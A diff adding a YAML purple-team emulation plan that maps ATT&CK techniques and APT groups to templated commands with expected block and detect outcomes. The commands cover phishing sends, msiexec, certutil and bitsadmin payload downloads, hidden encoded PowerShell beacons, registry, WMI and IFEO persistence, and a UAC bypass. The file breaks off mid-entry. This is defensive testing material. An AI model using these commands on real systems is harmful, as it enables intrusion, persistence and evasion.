@@ -1,0 +1,2066 @@
+metadata:
+  prefix: FSI
+  bundle: FS Index 2022 v1
+Initial Access:
+- name: Spearphishing Link - Macro
+  description: Send a spearphishing email to a target inbox that contains a link to
+    a malicious payload
+  metadata:
+    isv: 1
+    tactic: TA0001
+    tid: T1566.002
+    x_vectr_id: ca75e3f7-e033-4973-aea0-c7bebc2cf0ca
+    groups:
+    - Wizard Spider
+    - Zirconium
+  guidance:
+  - ps> Send-MailMessage -SmtpServer {{ maildomain }} -UseSSL -BodyAsHTML -Subject
+    {{ subject }} -Body {{ bodywithlink }} -To {{ target }} -From {{ from }}
+  block:
+  - Malicious document blocked/quarantined by email gateway, or email delivered but
+    filtered to junk folder. Malicious URLs are rewritten and behavior analyzed in
+    sandbox consistent with attachments.
+  detect:
+  - Malicious email delivery alerted by email gateway (ideally blocked/quarantined
+    too with attachment stripped and URLs rewritten)
+  logs:
+  - mail
+  controls:
+  - Mail Gateway
+- name: Spearphishing Link - PDF with Link (Google Drive)
+  description: Send a link to a PDF payload hosted on Google Drive that has a link
+    to an exe also hosted on Google Drive to a target user
+  metadata:
+    isv: 1
+    tactic: TA0001
+    tid: T1566.002
+    x_vectr_id: 97b6feeb-a78a-4b6f-bb5f-a1169a51d7f4
+    groups:
+    - Wizard Spider
+    - Zirconium
+  guidance:
+  - ps> Send-MailMessage -SmtpServer {{ maildomain }} -UseSSL -BodyAsHTML -Subject
+    {{ subject }} -Body {{ body }} -To {{ target }} -From {{ from }} -Attachments
+    {{ attachment }}
+  block:
+  - Malicious document blocked/quarantined by email gateway, or email delivered but
+    filtered to junk folder. Malicious URLs are rewritten and behavior analyzed in
+    sandbox consistent with attachments.
+  detect:
+  - Malicious email delivery alerted by email gateway (ideally blocked/quarantined
+    too with attachment stripped and URLs rewritten)
+  logs:
+  - mail
+  controls:
+  - Mail Gateway
+- name: Attachment - Macro - Remote Template
+  description: Send phishing email to victim containing a malicious attachment.
+  metadata:
+    isv: 1
+    tactic: TA0001
+    tid: T1566.001
+    x_vectr_id: 4a8c6fd1-215b-422d-aed4-d116b4123b16
+    groups:
+    - Kimsuky
+    - APT29
+    - Wizard Spider
+    - Gamaredon
+  guidance:
+  - PS> Send-MailMessage -SmtpServer {{ maildomain }} -UseSSL -BodyAsHTML -Subject
+    {{ subject }} -Body {{ body }} -To {{ target }} -From {{ noreply@maildomain }}
+    -Attachments {{ attachment }}
+  block:
+  - Malicious document blocked/quarantined by email gateway, or email delivered but
+    filtered to junk folder. Malicious URLs are rewritten and behavior analyzed in
+    sandbox consistent with attachments.
+  detect:
+  - Malicious email delivery alerted by email gateway (ideally blocked/quarantined
+    too with attachment stripped and URLs rewritten)
+  logs:
+  - mail
+  controls:
+  - Mail Gateway
+- name: Spearphishing Attachment - Macro
+  description: Send a spearphishing attachment containing a malicious macro payload
+    to a target inbox
+  metadata:
+    isv: 1
+    tactic: TA0001
+    tid: T1566.001
+    x_vectr_id: 9ac06fa4-27b5-456a-bb6c-e147608830a2
+    groups:
+    - Kimsuky
+    - APT29
+    - Wizard Spider
+    - Gamaredon
+  guidance:
+  - ps> Send-MailMessage -SmtpServer {{ maildomain }} -UseSSL -BodyAsHTML -Subject
+    {{ subject }} -Body {{ body }} -To {{ target }} -From {{ from }} -Attachments
+    {{ attachment }}
+  block:
+  - Malicious document blocked/quarantined by email gateway, or email delivered but
+    filtered to junk folder. Malicious URLs are rewritten and behavior analyzed in
+    sandbox consistent with attachments.
+  detect:
+  - Malicious email delivery alerted by email gateway (ideally blocked/quarantined
+    too with attachment stripped and URLs rewritten)
+  logs:
+  - mail
+  controls:
+  - Mail Gateway
+- name: HTML Smuggling Attachment
+  description: Send phishing email to victim containing an HTML attachment that saves
+    an embedded ISO file to disk
+  metadata:
+    isv: 1
+    tactic: TA0001
+    tid: T1566.001
+    x_vectr_id: 829b2ff3-2cb2-48be-9162-f042082e94d7
+    x_references:
+    - https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/
+    groups:
+    - Kimsuky
+    - APT29
+    - Wizard Spider
+    - Gamaredon
+  guidance:
+  - PS> Send-MailMessage -SmtpServer {{ maildomain }} -UseSSL -BodyAsHTML -Subject
+    {{ subject }} -Body {{ body }} -To {{ target }} -From {{ noreply@maildomain }}
+    -Attachments {{ attachment }}
+  block:
+  - Malicious document blocked/quarantined by email gateway, or email delivered but
+    filtered to junk folder.  Malicious URLs are rewritten and behavior analyzed in
+    sandbox consistent with attachments.
+  detect:
+  - Malicious email delivery alerted by email gateway (ideally blocked/quarantined
+    too with attachment stripped and URLs rewritten)
+  logs:
+  - mail
+  controls:
+  - Mail Gateway
+- name: Spearphishing Attachment - PDF with Link (Google Drive)
+  description: Send a PDF attachment payload that has a link to an exe hosted on Google
+    Drive to a target user.
+  metadata:
+    isv: 1
+    tactic: TA0001
+    tid: T1566.001
+    x_vectr_id: 3e946ca8-2349-4618-8fcf-c23cdd29cbb2
+    groups:
+    - Kimsuky
+    - APT29
+    - Wizard Spider
+    - Gamaredon
+  guidance:
+  - ps> Send-MailMessage -SmtpServer {{ maildomain }} -UseSSL -BodyAsHTML -Subject
+    {{ subject }} -Body {{ body }} -To {{ target }} -From {{ from }} -Attachments
+    {{ attachment }}
+  block:
+  - Malicious document blocked/quarantined by email gateway, or email delivered but
+    filtered to junk folder. Malicious URLs are rewritten and behavior analyzed in
+    sandbox consistent with attachments.
+  detect:
+  - Malicious email delivery alerted by email gateway (ideally blocked/quarantined
+    too with attachment stripped and URLs rewritten)
+  logs:
+  - mail
+  controls:
+  - Mail Gateway
+- name: External Portal Spray - 1
+  description: Perform a password spray against an external login portal using a list
+    of potential users and a single password
+  metadata:
+    isv: 1
+    tactic: TA0006
+    tid: T1110.003
+    x_vectr_id: 44fd7250-e613-441f-9cb6-5b98c2d71338
+    groups:
+    - APT28
+  guidance:
+  - Burp -> intruder
+  block:
+  - Portal protected with secure MFA solution
+  - WAF is in place for application to help block automated attacks
+  detect:
+  - Large number of authentication requests detected by WAF, IDS/IPS, or firewall.
+  - Web application logs are ingested into the SIEM and alerts triggered for suspicious
+    activity (e.g. brute force attacks, large number of 400/500 status codes)
+  logs:
+  - web
+  controls:
+  - WAF
+  - SIEM
+Execution:
+- name: Execute remote exe using MSI payload
+  description: Using msiexec and an MSI payload, download and execute an exe hosted
+    on a public HTTPS server
+  metadata:
+    isv: 1
+    tactic: TA0005
+    tid: T1218.007
+    x_vectr_id: 32eb0b1b-6633-49ff-ab55-935c1cfa25f2
+    x_references:
+    - https://www.zscaler.com/blogs/security-research/apt-31-leverages-covid-19-vaccine-theme-and-abuses-legitimate-online
+    groups:
+    - Lazarus
+    - Zirconium
+  platforms:
+  - windows
+  guidance:
+  - CMD> msiexec.exe /q /i {{ exe_url }}
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  - Payload on disk deleted/quarantined by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  - Payload on disk triggers a endpoint security tool alert
+  logs:
+  - edr:telemetry
+  - process_create
+  controls:
+  - Endpoint Protection
+  - SIEM
+- name: Remote template VBS launcher
+  description: Execute an Office document on the endpoint that will pull down and
+    execute a malicious document template containing a macro to launch a VBS payload
+  metadata:
+    isv: 1
+    tactic: TA0005
+    tid: T1221
+    x_vectr_id: 0ef4f9c7-ac14-4127-839e-b7ddee1b31cd
+    x_references:
+    - https://blog.trendmicro.com/trendlabs-security-intelligence/gamaredon-apt-group-use-covid-19-lure-in-campaigns/
+    groups:
+    - Lazarus
+    - Gamaredon
+  platforms:
+  - windows
+  block:
+  - Macro execution is blocked by GPO policy
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  - Payload on disk deleted/quarantined by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  - Payload on disk triggers a endpoint security tool alert
+  logs:
+  - edr:telemetry
+  - process_create
+  controls:
+  - Endpoint Protection
+  - Hardening
+  - SIEM
+- name: Macro - Remote Template
+  description: Execute a malicious Office document on the endpoint
+  metadata:
+    isv: 1
+    tactic: TA0005
+    tid: T1221
+    x_vectr_id: a7134d71-dc49-41a8-a309-ec520c96a089
+    groups:
+    - Lazarus
+    - Gamaredon
+  platforms:
+  - windows
+  block:
+  - Macro execution is blocked by GPO policy
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  - Payload on disk deleted/quarantined by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  - Payload on disk triggers a endpoint security tool alert
+  logs:
+  - edr:telemetry
+  - process_create
+  controls:
+  - Endpoint Protection
+  - Hardening
+  - SIEM
+- name: DLL execution using Rundll32
+  description: Execute a malicious UPX-packed DLL's function directly using rundll32
+  metadata:
+    isv: 1
+    tactic: TA0005
+    tid: T1218.011
+    x_vectr_id: ed9a5a57-b893-4b3d-81cd-dd637a73b567
+    x_references:
+    - https://us-cert.cisa.gov/ncas/analysis-reports/ar20-232a
+    groups:
+    - APT29
+    - Wizard Spider
+    - Lazarus
+  platforms:
+  - windows
+  guidance:
+  - cmd> rundll32 {{ dll }},{{ export }} [{{ args }}]
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  - Payload on disk deleted/quarantined by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  - Payload on disk triggers a endpoint security tool alert
+  logs:
+  - edr:telemetry
+  - process_create
+  controls:
+  - Endpoint Protection
+  - SIEM
+- name: VBScript execution using Rundll32
+  description: Execute in-line VBScript code using rundll32
+  metadata:
+    isv: 1
+    tactic: TA0005
+    tid: T1218.011
+    x_vectr_id: 9301d87c-fc3a-41e2-86f8-d2d694fa7805
+    x_references:
+    - https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/
+    - https://www.stormshield.com/news/poweliks-command-line-confusion/
+    groups:
+    - APT29
+    - Wizard Spider
+    - Lazarus
+  platforms:
+  - windows
+  guidance:
+  - 'cmd> rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+Execute({{ vbscript }})(window.close)
+
+    example (file): rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+Execute(CreateObject("Scripting.FileSystemObject").OpenTextFile("file.vbs").ReadAll())(window.close)
+
+    example (registry): rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+Execute(CreateObject("WScript.Shell").RegRead("HKCU\foo"))(window.close)'
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  logs:
+  - edr:telemetry
+  - process_create
+  controls:
+  - Endpoint Protection
+  - SIEM
+- name: Execution using PowerShell encoded command
+  description: Establish an initial foothold using a PowerShell encoded command that
+    launches a Cobalt Strike beacon in-memory
+  metadata:
+    isv: 1
+    tactic: TA0002
+    tid: T1059.001
+    x_vectr_id: 08fe6b3d-b17b-421e-a6d7-2ece76f98066
+    groups:
+    - Wizard Spider
+  platforms:
+  - windows
+  guidance:
+  - cmd> powershell -nop -w hidden -encodedcommand {{ encoded_command }}
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  logs:
+  - edr:telemetry
+  - process_create
+  controls:
+  - Endpoint Protection
+  - SIEM
+- name: Process creation using Regsvr32 and DLL
+  description: Spawn a new process with Regsvr32 and an on-disk DLL payload.
+  metadata:
+    isv: 1
+    tactic: TA0005
+    tid: T1218.010
+    x_vectr_id: 492043f3-1847-4492-946e-137db9e54f2d
+    groups:
+    - Kimsuky
+  platforms:
+  - windows
+  guidance:
+  - CMD> regsvr32 /s {{ dll }}
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  - Payload on disk deleted/quarantined by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  - Payload on disk triggers a endpoint security tool alert
+  logs:
+  - edr:telemetry
+  - process_create
+  controls:
+  - Endpoint Protection
+  - SIEM
+Command and Control:
+- name: C2 over Dropbox
+  description: Establish a command and control channel using Dropbox
+  metadata:
+    isv: 1
+    tactic: TA0011
+    tid: T1102.002
+    x_vectr_id: 43ab96a9-b2c0-442a-b8e4-18e172a1a2ce
+    x_references:
+    - https://www.zscaler.com/blogs/security-research/apt-31-leverages-covid-19-vaccine-theme-and-abuses-legitimate-online
+    groups:
+    - Zirconium
+  block:
+  - C2 channel using legitimate service is blocked by proxy, firewall, or network
+    behavioral/UEBA tool
+  detect:
+  - C2 channel using legitimate service is detected by proxy, firewall, or network
+    behavioral/UEBA tool
+  logs:
+  - web
+  - network
+  controls:
+  - Firewall
+  - ID/PS
+  - UEBA
+  - Web Gateway
+- name: Beacon DNS over udp/53 (TXT)
+  description: Connect to an attacker-controlled command and control server over DNS
+    TXT communications
+  metadata:
+    isv: 1
+    tactic: TA0011
+    tid: T1071.004
+    x_vectr_id: b587c51f-ec7d-4d94-a32e-4bc45b30a3a6
+    groups:
+    - APT41
+  block:
+  - Anomalous outbound DNS traffic is blocked at the firewall or by the DNS server
+  - C2 channel is blocked by proxy, firewall, or network behavioral/UEBA tool
+  detect:
+  - SIEM rules are configured to detect and alert on suspicious DNS traffic
+  - C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool
+  logs:
+  - dns
+  - network
+  controls:
+  - Firewall
+  - UEBA
+  - ID/PS
+- name: HTTPS C2 using self-signed certificate and custom profile
+  description: Connect to an attacker-controlled command and control server that uses
+    a self-signed certificate with known characteristics
+  metadata:
+    isv: 1
+    tactic: TA0011
+    tid: T1071.001
+    x_vectr_id: 94eaee96-437b-4685-b23e-43af9806956c
+    groups:
+    - Kimsuky
+    - APT41
+    - APT29
+  platforms:
+  - windows
+  block:
+  - C2 channel is blocked by proxy, firewall, or network behavioral/UEBA tool
+  - Channel is blocked by network security tool based on likeness to certificate characteristics
+    used by threat actors
+  detect:
+  - C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool
+  - Channel is blocked by network security tool based on likeness to certificate characteristics
+    used by threat actors
+  logs:
+  - web
+  - network
+  controls:
+  - Firewall
+  - ID/PS
+  - UEBA
+  - Web Gateway
+- name: Cobalt Strike Beacon over HTTP tcp/80 using custom profile
+  description: Connect to an attacker-controlled command and control server over HTTP
+  metadata:
+    isv: 1
+    tactic: TA0011
+    tid: T1071.001
+    x_vectr_id: ba24bcaf-72f4-457d-a23e-b7b6d61a633e
+    groups:
+    - Kimsuky
+    - APT41
+    - APT29
+  platforms:
+  - windows
+  block:
+  - C2 channel is blocked by proxy, firewall, or network behavioral/UEBA tool
+  detect:
+  - C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool
+  logs:
+  - web
+  - network
+  controls:
+  - Firewall
+  - ID/PS
+  - UEBA
+  - Web Gateway
+- name: Cobalt Strike Beacon over HTTPS tcp/443 using custom profile
+  description: Connect to an attacker-controlled command and control server over HTTPS
+  metadata:
+    isv: 1
+    tactic: TA0011
+    tid: T1071.001
+    x_vectr_id: b950ca8f-7e6c-45bf-9f3c-7ebf5f7e4f52
+    groups:
+    - Kimsuky
+    - APT41
+    - APT29
+  platforms:
+  - windows
+  block:
+  - C2 channel is blocked by proxy, firewall, or network behavioral/UEBA tool
+  detect:
+  - C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool
+  logs:
+  - web
+  - network
+  controls:
+  - Firewall
+  - ID/PS
+  - UEBA
+  - Web Gateway
+- name: Remote tool download over FTP
+  description: Download a binary payload into the environment using FTP
+  metadata:
+    isv: 1
+    tactic: TA0011
+    tid: T1105
+    x_vectr_id: 9612bc65-4dc9-4783-aafc-f0c1cc0eea03
+    groups:
+    - APT28
+    - APT29
+    - APT41
+    - Gamaredon
+  guidance:
+  - "ftp> \nOPEN {{ ftp_server }}\nUSER {{ user }}\nPASS {{ password }}\nGET {{ file\
+    \ }} {{ dest }}'"
+  block:
+  - Connections to known malicious domains/IPs are blocked
+  - Signatues for known bad tools are blocked by network security controls such as
+    an ID/PS
+  - Connections using insecure/outdated protocols are blocked by network security
+    controls
+  detect:
+  - Connections to known malicious domains/IPs are detected
+  - Signatues for known bad tools are detected by network security controls such as
+    an ID/PS
+  - Connections using insecure/outdated protocols are detected by network security
+    controls
+  logs:
+  - network
+  controls:
+  - Firewall
+  - ID/PS
+- name: Download batch file using bitsadmin over HTTP
+  description: Download a batch file payload from a public HTTP server using bitsadmin
+  metadata:
+    isv: 1
+    tactic: TA0011
+    tid: T1105
+    x_vectr_id: bcbb7655-18b0-4385-bc05-b6af2e98e4b9
+    groups:
+    - APT28
+    - APT29
+    - APT41
+    - Gamaredon
+  platforms:
+  - windows
+  guidance:
+  - cmd> cmd /c bitsadmin /transfer bbbb {{ url }} {{ local_dest }}
+  block:
+  - Connections to known malicious domains/IPs are blocked
+  - Signatues for known bad tools are blocked by network security controls such as
+    an ID/PS
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  detect:
+  - Connections to known malicious domains/IPs are detected
+  - Signatues for known bad tools are detected by network security controls such as
+    an ID/PS
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  logs:
+  - web
+  - process_create
+  - edr:telemetry
+  controls:
+  - Firewall
+  - ID/PS
+  - Endpoint Protection
+  - SIEM
+- name: Download file over HTTP using Certutil
+  description: Download a file from a public HTTP server using certutil
+  metadata:
+    isv: 1
+    tactic: TA0011
+    tid: T1105
+    x_vectr_id: b19ce681-bab3-450d-b497-7e5cdfdd87c7
+    groups:
+    - APT28
+    - APT29
+    - APT41
+    - Gamaredon
+  platforms:
+  - windows
+  guidance:
+  - cmd> certutil.exe  -urlcache -split -f {{ url }}
+  block:
+  - Connections to known malicious domains/IPs are blocked
+  - Signatues for known bad tools are blocked by network security controls such as
+    an ID/PS
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  detect:
+  - Connections to known malicious domains/IPs are detected
+  - Signatues for known bad tools are detected by network security controls such as
+    an ID/PS
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  logs:
+  - web
+  - process_create
+  - edr:telemetry
+  controls:
+  - Firewall
+  - ID/PS
+  - Endpoint Protection
+  - SIEM
+Persistence:
+- name: Persist via Registry Run Key
+  description: Run a payload during user login by setting a registry run key to launch
+    a VBScript file in the user's Documents folder
+  metadata:
+    isv: 1
+    tactic: TA0003
+    tid: T1547.001
+    x_vectr_id: acce357b-0626-408d-b73c-8f21c0f65dd0
+    x_references:
+    - https://www.trendmicro.com/en_us/research/20/d/gamaredon-apt-group-use-covid-19-lure-in-campaigns.html
+    groups:
+    - Gamaredon
+    - Kimsuky
+    - APT29
+    - Wizard Spider
+    - Lazarus
+    - Zirconium
+  platforms:
+  - windows
+  guidance:
+  - CMD> reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "MediaPlayer"
+    /t REG_SZ /F /D "wscript.exe //b %USERPROFILE%\Documents\MediaPlayer\PlayList.vbs"
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  - Suspicious Windows registry modifications detected in the SIEM using Windows system
+    events
+  logs:
+  - winevent
+  - edr:telemetry
+  controls:
+  - SIEM
+  - Endpoint Protection
+- name: Persist via new startup folder item
+  description: Persist on a system by placing an binary payload in a startup folder
+  metadata:
+    isv: 1
+    tactic: TA0003
+    tid: T1547.001
+    x_vectr_id: 197a9568-3795-4b86-897e-4b13937fee39
+    x_references:
+    - https://us-cert.cisa.gov/ncas/analysis-reports/ar20-133b
+    groups:
+    - Gamaredon
+    - Kimsuky
+    - APT29
+    - Wizard Spider
+    - Lazarus
+    - Zirconium
+  platforms:
+  - windows
+  guidance:
+  - cmd> copy "{{ payload }}" "C:\Users\{{ username }}\AppData\Roaming\Microsoft\Windows\Start
+    Menu\Programs\Startup\Narrator.exe"
+  block:
+  - null
+  detect:
+  - Detect suspicious startup item creation using endpoint security tool filesystem
+    telemetry or Windows event id 4656 after configuring auditing on the startup paths
+  logs:
+  - winevent
+  controls:
+  - Endpoint Protection
+  - SIEM
+- name: Persist via Windows "Load" Registry Run Key
+  description: Run a payload during user login by setting a registry run key to launch
+    an executable file in the user's local APPDATA folder
+  metadata:
+    isv: 1
+    tactic: TA0003
+    tid: T1547.001
+    x_vectr_id: 7a2895d9-513b-4ecf-b753-dd7e1e77c59a
+    x_references:
+    - https://www.cybereason.com/blog/research/back-to-the-future-inside-the-kimsuky-kgh-spyware-suite
+    groups:
+    - Gamaredon
+    - Kimsuky
+    - APT29
+    - Wizard Spider
+    - Lazarus
+    - Zirconium
+  platforms:
+  - windows
+  guidance:
+  - CMD> reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v Load
+    /t REG_SZ /F /D C:\Users\{{ user }}\AppData\Local\AreSoft\msic.exe
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  - Suspicious Windows registry modifications detected in the SIEM using Windows system
+    events
+  logs:
+  - winevent
+  - edr:telemetry
+  controls:
+  - SIEM
+  - Endpoint Protection
+- name: Persist via new Windows service created in Registry
+  description: Create a new Windows service by modifying the Registry
+  metadata:
+    isv: 1
+    tactic: TA0003
+    tid: T1543.003
+    x_vectr_id: 81f2fa04-79df-4c0b-aea5-a5da584c3879
+    x_references:
+    - https://blog.group-ib.com/colunmtk_apt41
+    x_tool_links:
+    - https://gist.github.com/2XXE-SRA/36cd5c4a1db53a1b5f3ac47be1c74c97
+    groups:
+    - Wizard Spider
+    - Kimsuky
+    - APT41
+    - Lazarus
+  platforms:
+  - windows
+  prerequisites:
+  - local_admin
+  guidance:
+  - CMD> {{ bat_file }}
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  - Suspicious Windows registry modifications detected in the SIEM using Windows system
+    events
+  logs:
+  - winevent
+  - edr:telemetry
+  controls:
+  - SIEM
+  - Endpoint Protection
+- name: Persist via new Logon Script
+  description: Persist on a system by adding a Registry key to the logon script hive
+    in order to run a VBScript payload at logon.
+  metadata:
+    isv: 1
+    tactic: TA0003
+    tid: T1037.001
+    x_vectr_id: d555460a-1b01-494a-a415-29c312652440
+    x_references:
+    - https://www.cybereason.com/blog/research/back-to-the-future-inside-the-kimsuky-kgh-spyware-suite
+    groups:
+    - Kimsuky
+  platforms:
+  - windows
+  guidance:
+  - 'cmd> reg.exe add HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "cmd
+    /c cd C:\Users\{{ user }}\AppData\Roaming\Microsoft\Templates & copy winload.x
+    a.vbs & cs.exe a.vbs & del a.vbs" /f
+
+    (cs.exe = wscript.exe)'
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  - Suspicious Windows registry modifications detected in the SIEM using Windows system
+    events
+  logs:
+  - winevent
+  - edr:telemetry
+  controls:
+  - SIEM
+  - Endpoint Protection
+- name: Persist via Image File Execution Options (IFEO) on dllhost.exe
+  description: Execute a VBScript payload using wscript.exe by setting the execution
+    command as the image file execution option for dllhost.exe then waiting for dllhost.exe
+    to launch by itself or by manually starting it
+  metadata:
+    isv: 1
+    tactic: TA0003
+    tid: T1546.012
+    x_vectr_id: c6da1505-a7e4-4e1f-b4f0-f7536744d559
+    x_references:
+    - https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/
+    groups:
+    - APT29
+  platforms:
+  - windows
+  prerequisites:
+  - local_admin
+  guidance:
+  - cmd> reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
+    File Execution Options\dllhost.exe" /v Debugger /f /d "wscript.exe {{ vbs_payload
+    }}"
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  - Suspicious Windows registry modifications detected in the SIEM using Windows system
+    events
+  logs:
+  - winevent
+  - edr:telemetry
+  controls:
+  - SIEM
+  - Endpoint Protection
+- name: Persist via WMI Event Subscription
+  description: Establish persistence on a target system by creating a WMI CommandlineEventConsumer
+    event subscription that launches a malicious dll payload with rundll32
+  metadata:
+    isv: 1
+    tactic: TA0003
+    tid: T1546.003
+    x_vectr_id: 977e7354-9cbd-4a7f-90b6-d1156c675983
+    groups:
+    - APT29
+  platforms:
+  - windows
+  prerequisites:
+  - local_admin
+  guidance:
+  - cmd> wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="__timeritem",
+    EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent
+    WITHIN 70 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND
+    TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime < 4400"
+  - cmd> wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE
+    Name="setpolicytrace", ExecutablePath="C:\Windows\System32\rundll32.exe",CommandLineTemplate="C:\Windows\System32\rundll32.exe
+    {{ dll_payload }} {{ dll_export }}"
+  - cmd> wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE
+    Filter="__EventFilter.Name=\"__timeritem\"", Consumer="CommandLineEventConsumer.Name=\"setpolicytrace\""
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  - Anomalous WMI event filter, consumer, and/or filter to consumer binding creation
+    is blocked by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  - Anomalous WMI event filter, consumer, and/or filter to consumer binding creation
+    is detected by endpoint security tool or in the SIEM using endpoint security tool
+    telemetry or native windows event ids (ex 5857).
+  logs:
+  - winevent
+  - edr:telemetry
+  controls:
+  - SIEM
+  - Endpoint Protection
+- name: Persist via Userinit Winlogon
+  description: Persist on a system by creating an LNK in the user's startup folder
+    that points an exe payload then adding the LNK to the userinit registry
+  metadata:
+    isv: 1
+    tactic: TA0003
+    tid: T1547.004
+    x_vectr_id: bb04822a-bea8-41f9-9ff9-9c4dfe5a88fb
+    groups:
+    - Wizard Spider
+  prerequisites:
+  - local_admin
+  platforms:
+  - windows
+  guidance:
+  - cmd> reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+    /v "Userinit" /t REG_SZ /f /d "C:\Windows\system32\userinit.exe,%APPDATA%\Microsoft\Windows\Start
+    Menu\Programs\Startup\{{ lnk_name }}.lnk"
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  - Suspicious Windows registry modifications detected in the SIEM using Windows system
+    events
+  logs:
+  - winevent
+  - edr:telemetry
+  controls:
+  - SIEM
+  - Endpoint Protection
+- name: Persist via new Scheduled Task
+  description: Persist on a system by creating a new scheduled task
+  metadata:
+    isv: 1
+    tactic: TA0003
+    tid: T1053.005
+    x_vectr_id: ced4c9aa-fe3d-4f70-a278-66955dd436d9
+    groups:
+    - Wizard Spider
+  platforms:
+  - windows
+  prerequisites:
+  - local_admin
+  guidance:
+  - cmd> schtasks.exe /CREATE /SC ONSTART /TN jf0c /TR "'C:\Users\pagefilerpqy.exe'"
+    /f /RL HIGHEST
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  - Suspicious Windows task registration detected in the SIEM using Windows system
+    events
+  logs:
+  - winevent
+  - edr:telemetry
+  controls:
+  - SIEM
+  - Endpoint Protection
+Defense Evasion:
+- name: Bypass User Account Contrl (UAC) via schtasks
+  description: Bypass user account controls (UAC) to move to a high-integrity execution
+    context via the DiskCleanup environment variable method
+  metadata:
+    isv: 1
+    tactic: TA0004
+    tid: T1548.002
+    x_vectr_id: b8fe628f-60cc-4a57-8979-957fc867b21d
+    x_references:
+    - https://www.cybereason.com/blog/research/back-to-the-future-inside-the-kimsuky-kgh-spyware-suite
+    - https://www.tiraniddo.dev/2017/05/exploiting-environment-variables-in.html
+    groups:
+    - Winnti
+    - Kimsuky
+  platforms:
+  - windows
+  prerequisites:
+  - local_admin
+  guidance:
+  - cmd> reg add hkcu\Environment /v windir /d "cmd /K reg delete hkcu\Environment
+    /v windir /f && REM "
+  - cmd> schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  - Suspicious Windows registry modifications detected in the SIEM using Windows system
+    events
+  logs:
+  - winevent
+  - edr:telemetry
+  controls:
+  - SIEM
+  - Endpoint Protection
+- name: Reflective DLL Injection
+  description: Inject a malicious reflective DLL into a running process in order to
+    launch a Cobalt Strike beacon
+  metadata:
+    isv: 1
+    tactic: TA0005
+    tid: T1055.001
+    x_vectr_id: a81bff20-9cef-42ff-b4bd-9211e529bab4
+    groups:
+    - APT29
+    - Wizard Spider
+  platforms:
+  - windows
